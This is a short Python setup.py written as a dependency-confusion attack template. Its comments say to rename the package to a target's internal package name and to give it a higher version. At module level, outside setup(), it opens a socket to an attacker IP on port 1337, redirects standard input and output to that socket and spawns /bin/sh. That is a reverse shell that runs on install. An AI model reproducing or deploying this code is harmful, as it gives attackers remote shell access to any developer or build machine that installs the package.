from setuptools import setup, find_packages
from setuptools.command.install import install
import setuptools
import socket
import os
from os import system
import pty

# Change 'name' to the vulnerable package, set the version to one higher than that of the installed package etc...
setup(
    name = "vulnerable_internal_package",
    version = "9.9.9",
    python_requires='>3.9',
    packages = find_packages()
)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.69.12.1",1337)) # Obviously, set this to attacker machine IP and port.
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
